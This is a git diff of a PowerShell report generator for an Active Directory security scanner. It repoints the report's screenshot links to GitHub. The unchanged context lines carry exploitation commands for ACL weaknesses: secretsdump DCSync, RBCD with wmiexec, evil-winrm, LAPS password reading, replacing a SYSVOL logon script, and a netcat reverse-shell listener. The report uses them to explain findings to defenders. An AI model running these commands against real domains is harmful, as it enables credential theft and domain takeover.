@@ -104,7 +104,7 @@ function Generate-ACLshtml {
                                                     <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as GenericAll, GenericWrite, WriteDacl or AllExtendedRights using bloodhound.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/entiredomain-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/entiredomain-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -115,7 +115,7 @@ function Generate-ACLshtml {
                                                     <p class="code">impacket-secretsdump test:'Password123!'@dc.test.local</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/entiredomain-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/entiredomain-2.png"
                                                         alt="Exploiting rogue ACLs">
                                                 </span>
                                             </div>
@@ -199,7 +199,7 @@ function Generate-ACLshtml {
                                                     <p>1. A low-privileged user can remotely enumerate rogue ACLs over the domain object for rights such as AllExtendedRights (permission to DCSync) using bloodhound.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/dcsync-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/dcsync-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -210,7 +210,7 @@ function Generate-ACLshtml {
                                                     <p class="code">impacket-secretsdump dcsyncer:'Password123!'@dc.test.local</p>            
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/dcsync-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/dcsync-2.png"
                                                         alt="Exploiting rogue ACLs">
                                                 </span>
                                             </div>
@@ -294,7 +294,7 @@ function Generate-ACLshtml {
                                                     <p>1. A low-privileged user can remotely enumerate rogue ACLs over target servers for rights such as GenericWrite / GenericAll using bloodhound.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/RBCD-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/RBCD-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -307,7 +307,7 @@ function Generate-ACLshtml {
                                                     <p class="code">impacket-rbcd -delegate-from 'attackerPC$' -delegate-to 'DC$' -dc-ip 192.168.10.141 -action 'write' 'test.local'/'rbcduser':'Password123!'</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/RBCD-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/RBCD-2.png"
                                                         alt="Setting RBCD">
                                                 </span>
                                             </div>
@@ -321,7 +321,7 @@ function Generate-ACLshtml {
                                                     <p class="code">impacket-wmiexec -k -no-pass administrator@dc.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/RBCD-3.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/RBCD-3.png"
                                                         alt="Exploiting RBCD">
                                                 </span>
                                             </div>
@@ -405,7 +405,7 @@ function Generate-ACLshtml {
                                                     <p>1. A low-privileged user can remotely enumerate rogue ACLs using bloodhound. In this example account operators has full control over the "remotemanagement" user who has permission to connect to the domaincontroller via WinRM.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/dangerousright-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/dangerousright-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -417,7 +417,7 @@ function Generate-ACLshtml {
                                                     <p class="code">evil-winrm -i dc.test.local -u remotemanagement -p newpassword</p>        
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/dangerousright-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/dangerousright-2.png"
                                                         alt="Exploiting rogue ACLs">
                                                 </span>
                                             </div>
@@ -501,7 +501,7 @@ function Generate-ACLshtml {
                                                     <p>1. A low-privileged user can remotely enumerate rogue ACLs over GPOs using bloodhound. In this example GPOACL has write permissions to the default domain policy which is incredibly dangerous.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/GPO-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/GPO-1.png"
                                                         alt="Finding rogue GPO ACLs">
                                                 </span>
                                             </div>
@@ -515,7 +515,7 @@ function Generate-ACLshtml {
                                                     <p class="code">impacket-wmiexec gpoacl:'Password123!'@dc.test.local</p>     
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/GPO-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/GPO-2.png"
                                                         alt="Exploiting rogue GPO ACLs">
                                                 </span>
                                             </div>
@@ -599,7 +599,7 @@ function Generate-ACLshtml {
                                                     <p>1. Low privileged users that have rogue permissions to read LAPS passwords can be found with bloodhound.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Passwords/LAPS-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Passwords/LAPS-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -610,7 +610,7 @@ function Generate-ACLshtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M laps</p>     
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/Passwords/LAPS-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Passwords/LAPS-2.png"
                                                         alt="Reading the LAPS password">
                                                 </span>
                                             </div>
@@ -693,7 +693,7 @@ function Generate-ACLshtml {
                                                     <p>1. Any low-privileged user can browse through NETLOGON scripts and find those which have insecure permissions assigned allowing modification.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-1.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/modifiablelogonscript-1.png"
                                                         alt="Finding rogue ACLs">
                                                 </span>
                                             </div>
@@ -704,7 +704,7 @@ function Generate-ACLshtml {
                                                     <p class="code">smbclient //dc.test.local/SYSVOL -U test%'Password123!'</p>     
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/ACLs/modifiablelogonscript-2.png"
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/modifiablelogonscript-2.png"
                                                         alt="Replacing the logon script">
                                                 </span>
                                             </div>
@@ -715,7 +715,7 @@ function Generate-ACLshtml {
                                                 <p class="code">nc -lvnp 443</p>   
                                             </div>
                                             <span class="image-cell">
-                                                <img src="/Private/Report/Images/ACLs/modifiablelogonscript-3.png"
+                                                <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/ACLs/modifiablelogonscript-3.png"
                                                     alt="Obtaining a reverse shell">
                                             </span>
                                         </div>
